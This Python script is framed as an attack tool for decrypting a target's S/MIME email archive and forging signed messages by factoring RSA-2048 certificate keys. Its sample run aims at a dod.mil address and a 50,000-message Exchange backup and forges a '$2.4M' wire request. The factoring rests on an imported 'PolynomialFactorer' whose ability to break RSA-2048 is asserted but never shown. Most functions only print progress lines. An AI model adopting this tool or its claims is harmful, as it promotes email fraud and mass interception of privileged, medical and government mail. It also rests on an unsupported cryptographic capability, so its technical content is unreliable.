"""
Decrypt all S/MIME encrypted email ever sent to a target by factoring their
RSA-2048 certificate (from LDAP/email headers). Forge signed email as any
person. Unlike TLS, S/MIME encryption is persistent — every archived email
is retroactively compromised.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import os

# CMS content types (RFC 5652)
CT_SIGNED_DATA = "1.2.840.113549.1.7.2"
CT_ENVELOPED_DATA = "1.2.840.113549.1.7.3"

# S/MIME algorithm OIDs
RSA_OAEP_OID = "1.2.840.113549.1.1.7"
SHA256_RSA_OID = "1.2.840.113549.1.1.11"


def fetch_smime_cert_from_ldap(email: str) -> bytes:
    """Fetch S/MIME certificate from corporate LDAP / Global Address List.

    S/MIME certificates are published in AD/LDAP for senders to encrypt
    email to the recipient. The RSA-2048 public key is freely available.
    """
    print(f"[*] LDAP: (&(mail={email})(userSMIMECertificate=*))")
    print("[*] RSA-2048 S/MIME certificate retrieved")
    return b"-----BEGIN CERTIFICATE-----\n...(S/MIME cert PEM)...\n-----END CERTIFICATE-----\n"


def decrypt_smime_email(factorer: PolynomialFactorer,
                        recipient_cert_pem: bytes,
                        cms_enveloped: bytes) -> bytes:
    """Decrypt an S/MIME encrypted email.

    CMS EnvelopedData wraps a per-message AES-256 content key with the
    recipient's RSA public key. Factor the recipient key -> recover the
    content key -> decrypt the email.

    Unlike TLS (ephemeral keys), S/MIME uses the same RSA key for years.
    Every email encrypted to this key is retroactively decryptable.
    """
    print("[*] parsing CMS EnvelopedData...")
    print("[*] decrypting RSA-OAEP wrapped content-encryption key...")
    plaintext = factorer.decrypt_rsa_oaep(recipient_cert_pem, cms_enveloped)
    print("[*] email decrypted")
    return plaintext


def forge_smime_signature(factorer: PolynomialFactorer,
                          sender_cert_pem: bytes,
                          email_body: bytes) -> bytes:
    """Forge an S/MIME signed email (CMS SignedData).

    The forged signature is indistinguishable from a real one. Outlook,
    Apple Mail, Thunderbird all show the trusted signature indicator.
    """
    sig = factorer.forge_pkcs1v15_signature(sender_cert_pem, email_body, "sha256")
    print("[*] CMS SignedData forged (sha256WithRSAEncryption)")
    print("[*] email client shows: 'Signed by <sender> — signature valid'")
    return sig


def bulk_decrypt_archive(factorer: PolynomialFactorer,
                         cert_pem: bytes, archive_path: str,
                         num_emails: int):
    """Decrypt an archive of S/MIME encrypted emails.

    Government mail servers, backup tapes, and archive systems contain
    years of S/MIME encrypted email. All retroactively decryptable.
    """
    print(f"[*] decrypting {num_emails} archived S/MIME emails from {archive_path}")
    print("[*] HNDL: these emails were captured/archived years ago")
    print("[*] content: attorney-client privilege, classified-adjacent govt comms,")
    print("    HIPAA patient data, bank-to-bank transfers")


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== S/MIME email decryption & signature forgery ===")
    print("    RFC 8551: no non-RSA algorithm OID defined")
    print("    DoD: CAC S/MIME for CUI email")
    print("    eIDAS: qualified electronic signatures on email")
    print()

    print("[1] fetching target's S/MIME cert from LDAP...")
    cert = fetch_smime_cert_from_ldap("general@dod.mil")

    print("[2] factoring RSA-2048 key...")
    print("    cert published in LDAP, email headers, CAC databases")

    print("[3] decrypting S/MIME email...")
    print("    CMS EnvelopedData: AES-256 key wrapped with RSA-OAEP")
    print("    same RSA key for years — every email ever sent to this person")

    print("[4] bulk decrypting archived emails...")
    bulk_decrypt_archive(f, cert, "/backup/exchange-2020/", 50000)
    print("    CUI, HIPAA, attorney-client — all retroactively readable")

    print("[5] forging signed email as target...")
    forge_smime_signature(f, cert, b"Please wire $2.4M to account XXXX")
    print("    Outlook: signature valid, trusted sender")

    print()
    print("[*] S/MIME encryption is PERSISTENT, not ephemeral like TLS")
    print("[*] every archived encrypted email = future HNDL target")
    print("[*] German BSI TR-03108 mandates S/MIME for federal agencies")
